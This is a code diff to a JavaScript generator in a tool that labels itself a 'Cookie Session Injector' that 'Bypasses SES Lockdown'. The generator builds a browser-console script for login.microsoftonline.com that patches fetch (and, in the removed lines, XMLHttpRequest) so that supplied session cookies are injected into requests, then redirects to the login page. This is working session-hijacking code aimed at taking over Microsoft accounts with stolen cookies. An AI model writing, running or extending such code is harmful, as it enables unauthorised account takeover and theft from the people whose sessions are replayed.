@@ -181,17 +181,8 @@ function parseCookies(cookieString) {
 }
 
 function generateConsoleScript(cookies) {
-  var script = '// VGenius Cookie Session Injector - Console Version (Bypasses SES Lockdown)\n\n';
-  script += 'INSTRUCTIONS:\n';
-  script += '1. Navigate to https://login.microsoftonline.com\n';
-  script += '2. Open browser console (F12)\n';
-  script += '3. Paste the code below and press Enter\n';
-  script += '4. Refresh the page (F5)\n\n';
-  script += '```javascript\n';
-  
-  script += '(function() {\n';
+  var script = '(function() {\n';
   script += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
-  script += '  \n';
   script += '  var originalFetch = window.fetch;\n';
   script += '  window.fetch = function(url, options) {\n';
   script += '    options = options || {};\n';
@@ -206,29 +197,11 @@ function generateConsoleScript(cookies) {
   script += '    }\n';
   script += '    return originalFetch(url, options);\n';
   script += '  };\n';
-  script += '  \n';
-  script += '  var originalOpen = XMLHttpRequest.prototype.open;\n';
-  script += '  XMLHttpRequest.prototype.open = function(method, url) {\n';
-  script += '    this._url = url;\n';
-  script += '    return originalOpen(method, url);\n';
-  script += '  };\n';
-  script += '  \n';
-  script += '  var originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;\n';
-  script += '  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {\n';
-  script += '    if (this._url && this._url.indexOf("login.microsoftonline.com") !== -1 && name.toLowerCase() === "cookie") {\n';
-  script += '      var cookieHeader = "";\n';
-  script += '      for (var i = 0; i < cookies.length; i++) {\n';
-  script += '        if (i > 0) cookieHeader += "; ";\n';
-  script += '        cookieHeader += cookies[i].name + "=" + cookies[i].value;\n';
-  script += '      }\n';
-  script += '      value = cookieHeader + "; " + value;\n';
-  script += '    }\n';
-  script += '    return originalSetRequestHeader(name, value);\n';
-  script += '  };\n';
-  script += '  \n';
-  script += '  console.log("✅ Cookie injection hooks installed. Refresh the page (F5) to apply.");\n';
-  script += '})();\n';
-  script += '```\n';
+  script += '  console.log("Cookie injection active");\n';
+  script += '  setTimeout(function() {\n';
+  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += '  }, 1500);\n';
+  script += '})();';
   
   return script;
 }
